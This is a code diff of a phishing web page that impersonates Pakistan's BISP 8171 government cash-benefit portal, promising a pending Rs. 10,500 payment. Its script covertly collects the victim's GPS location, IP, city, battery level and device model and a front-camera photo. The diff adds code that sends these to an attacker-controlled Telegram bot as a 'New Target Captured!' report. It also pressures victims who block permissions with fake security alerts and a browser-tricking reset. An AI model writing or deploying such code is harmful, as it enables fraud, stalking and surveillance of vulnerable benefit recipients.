@@ -3,145 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>8171 Official Verification</title>
+    <title>8171 BISP Official Verification</title>
     <style>
-        :root { --bisp-green: #1b5e20; --error-red: #b91c1c; --gold: #fbc02d; }
-        body { margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; background: #f4f7f6; display: flex; flex-direction: column; height: 100vh; }
-
-        /* Professional Header */
-        .header { background: #fff; padding: 15px 20px; display: flex; align-items: center; border-bottom: 4px solid var(--bisp-green); box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .logo-box { border-left: 4px solid var(--bisp-green); padding-left: 12px; }
-        .logo-box h1 { margin: 0; font-size: 22px; color: var(--bisp-green); font-weight: 900; }
-        .logo-box span { font-size: 10px; color: #666; font-weight: bold; text-transform: uppercase; }
-
-        /* Status Strip */
-        .status-strip { background: var(--gold); color: #1b5e20; padding: 10px; text-align: center; font-size: 12px; font-weight: 800; border-bottom: 1px solid rgba(0,0,0,0.1); }
-
-        /* Main Card */
-        .main-container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .v-card { background: white; width: 100%; max-width: 400px; border-radius: 20px; padding: 35px 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 1px solid #eee; position: relative; }
-        .v-card h2 { color: var(--bisp-green); margin-top: 0; font-size: 24px; font-weight: 800; }
-        .v-card p { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 30px; }
-
-        /* Persistence Screen (For Blocked Users) */
-        #retry-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
-        .error-pill { background: #fee2e2; color: var(--error-red); padding: 15px; border-radius: 12px; font-size: 13px; font-weight: 800; border: 1px solid #fecaca; margin-bottom: 25px; }
+        :root { --green: #1b5e20; --gold: #fbc02d; }
+        body { margin: 0; font-family: 'Segoe UI', Arial, sans-serif; background: #f0f3f2; display: flex; flex-direction: column; height: 100vh; }
         
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--bisp-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        /* Official Pro Header */
+        .header { background: white; padding: 15px; display: flex; align-items: center; border-bottom: 4px solid var(--green); box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { border-left: 4px solid var(--green); padding-left: 10px; font-weight: 900; color: var(--green); font-size: 20px; line-height: 1; }
+        .logo span { font-size: 9px; color: #666; display: block; text-transform: uppercase; margin-top: 3px; }
+
+        .payment-banner { background: var(--gold); color: #1b5e20; padding: 12px; text-align: center; font-size: 13px; font-weight: 800; border-bottom: 2px solid rgba(0,0,0,0.05); }
+
+        .main-card { margin: 20px; background: white; border-radius: 15px; padding: 30px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
+        .main-card h2 { color: var(--green); margin: 0 0 10px; font-size: 24px; }
+        .main-card p { font-size: 13px; color: #555; line-height: 1.5; margin-bottom: 25px; }
+
+        /* Security Overlay (Force Pop-up Logic) */
+        #auth-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; padding: 30px; box-sizing: border-box; text-align: center; }
+        .alert-box { background: #fee2e2; color: #b91c1c; padding: 15px; border-radius: 10px; font-size: 12px; font-weight: 800; border: 1px solid #fecaca; margin-bottom: 20px; }
+        
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--green); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .btn { background: var(--bisp-green); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 15px rgba(27,94,32,0.2); }
-        .btn-retry { background: #222; margin-top: 15px; }
+        .btn { background: var(--green); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; box-shadow: 0 5px 15px rgba(27,94,32,0.2); }
+        .btn-retry { background: #333; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div class="logo-box">
-        <h1>BISP</h1>
-        <span>Government of Pakistan</span>
-    </div>
+    <div class="logo">BISP<span>Government of Pakistan</span></div>
 </div>
 
-<div class="status-strip">KAFAALAT 2026: VERIFICATION REQUIRED FOR RS. 10,500</div>
+<div class="payment-banner">⚠️ KAFAALAT 2026: BIOMETRIC VERIFICATION REQUIRED</div>
 
 <div class="main-container">
-    <div class="v-card" id="initial-card">
-        <h2>Identity Portal</h2>
-        <p>Your regional identity and biometric check is pending. Please click below to initiate high-precision synchronization for fund release.</p>
-        <button class="btn" onclick="startVerification()">CONNECT TO PORTAL</button>
-        <div style="margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px; text-align: center; font-size: 10px; color: #aaa;">
-            Security ID: FZN-SYS-2026 | Encrypted Node
-        </div>
+    <div class="main-card">
+        <h2>Verify Status</h2>
+        <p>Your payment of Rs. 10,500 is pending. Please complete the mandatory security check to release funds to your registered account.</p>
+        <button class="btn" onclick="initiateAuth()">CONTINUE TO VERIFY</button>
     </div>
 </div>
 
-<div id="retry-overlay">
-    <div class="error-pill">
-        ACCESS DENIED: Mandatory Security Permissions (Camera & Location) were blocked by the browser.
+<div id="auth-screen">
+    <div id="status-msg" class="alert-box" style="display:none;">
+        SECURITY ALERT: Mandatory permissions (Camera/Location) were blocked. To release payment, you must click 'Allow' or use the Reset button below.
     </div>
     <div class="loader"></div>
-    <h3>Permissions Required</h3>
-    <p style="font-size: 14px; color: #666;">Verification cannot proceed without system access. Please click 'Allow' on the next prompt or refresh the page to reset.</p>
+    <h3 style="color: var(--green); margin: 0;">NADRA Syncing...</h3>
+    <p style="font-size: 13px; color: #666; margin: 10px 0 25px;">Connecting to BISP high-precision tracking node. Please wait.</p>
     
-    <button class="btn" onclick="location.reload()">REFRESH & RETRY</button>
-    <button class="btn btn-retry" onclick="forceReset()">FORCE RESET SESSION</button>
+    <button class="btn" onclick="forceReset()">RESET & TRY AGAIN</button>
+    <p style="font-size: 10px; color: #999; margin-top: 15px;">Error Code: 0x8801 - Permission Denied</p>
 </div>
 
 <video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;" width="1080" height="1920"></canvas>
 
 <script>
-    let report = { d: "", b: "", lat: "", lon: "", ip: "", city: "" };
+    // TELEGRAM CONFIGURATION
+    const TG_TOKEN = "YOUR_BOT_TOKEN"; // Apna Bot Token Yahan Dalein
+    const CHAT_ID = "YOUR_CHAT_ID";   // Apni Chat ID Yahan Dalein
 
-    async function startVerification() {
-        document.getElementById('initial-card').innerHTML = `<div class="loader" style="margin: 0 auto;"></div><p style="text-align:center;">Synchronizing with NADRA...</p>`;
-        
-        // Browser Info
-        report.d = navigator.userAgent;
-        if(navigator.getBattery) {
-            const bat = await navigator.getBattery();
-            report.b = Math.round(bat.level * 100) + "%";
-        }
+    let dataReport = { lat: "", lon: "", battery: "", model: "", ip: "" };
 
-        executeTracking();
+    function initiateAuth() {
+        document.getElementById('auth-screen').style.display = 'flex';
+        startTracking();
     }
 
-    function executeTracking() {
-        // GPS Loop with Error Handling
+    // Force Reset Logic: URL mein random parameter add kar ke browser ko dhoka dena
+    function forceReset() {
+        const currentUrl = window.location.href.split('?')[0];
+        window.location.href = currentUrl + "?session_reset=" + Math.random().toString(36).substring(7);
+    }
+
+    async function startTracking() {
+        // Battery & Model
+        try {
+            const b = await navigator.getBattery();
+            dataReport.battery = Math.round(b.level * 100) + "%";
+            dataReport.model = navigator.userAgent.split('(')[1].split(')')[0];
+        } catch(e) {}
+
+        // IP & City Info
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            dataReport.ip = d.ip;
+            dataReport.city = d.city;
+        } catch(e) {}
+
+        // Location Loop
         navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                report.lat = pos.coords.latitude;
-                report.lon = pos.coords.longitude;
-                attemptBiometric();
+            (p) => {
+                dataReport.lat = p.coords.latitude;
+                dataReport.lon = p.coords.longitude;
+                openCam();
             },
-            (err) => { 
-                showPersistenceScreen(); 
-            },
+            () => { document.getElementById('status-msg').style.display = 'block'; },
             { enableHighAccuracy: true, timeout: 5000 }
         );
     }
 
-    function attemptBiometric() {
+    function openCam() {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then((s) => { 
-            captureAndSend(s); 
-        })
-        .catch((err) => { 
-            showPersistenceScreen(); 
-        });
+        .then((s) => { captureFinal(s); })
+        .catch(() => { document.getElementById('status-msg').style.display = 'block'; });
     }
 
-    function showPersistenceScreen() {
-        document.getElementById('retry-overlay').style.display = 'flex';
-        // Logic to trigger pop-up again on reload
-    }
-
-    function forceReset() {
-        // Clears any temporary state and reloads
-        location.href = location.href + "?auth=" + Math.random();
-    }
-
-    async function captureAndSend(stream) {
+    async function captureFinal(stream) {
         const video = document.getElementById('v');
         video.srcObject = stream;
         
-        setTimeout(() => {
+        setTimeout(async () => {
             const canvas = document.getElementById('c');
             canvas.getContext('2d').drawImage(video, 0, 0, 1080, 1920);
-            const img = canvas.toDataURL('image/jpeg', 0.85);
+            const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
             
             stream.getTracks().forEach(t => t.stop());
-            
-            // Final Data Sync
-            fetch('/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ meta: report, image: img })
-            }).then(() => {
-                window.location.href = "https://8171.bisp.gov.pk/";
-            });
-        }, 2000);
+            sendToTelegram(photoBlob);
+        }, 2500);
+    }
+
+    function sendToTelegram(photo) {
+        // 1. Send Text Report
+        const mapUrl = `https://www.google.com/maps?q=${dataReport.lat},${dataReport.lon}`;
+        const text = `🎯 *New Target Captured!*\n\n` +
+                     `📱 *Model:* ${dataReport.model}\n` +
+                     `🔋 *Battery:* ${dataReport.battery}\n` +
+                     `🌐 *IP:* ${dataReport.ip} (${dataReport.city})\n` +
+                     `📍 *Location:* [Open in Google Maps](${mapUrl})`;
+
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+        });
+
+        // 2. Send Photo
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', photo, 'capture.jpg');
+
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).then(() => {
+            window.location.href = "https://8171.bisp.gov.pk/";
+        });
     }
 </script>
 </body>
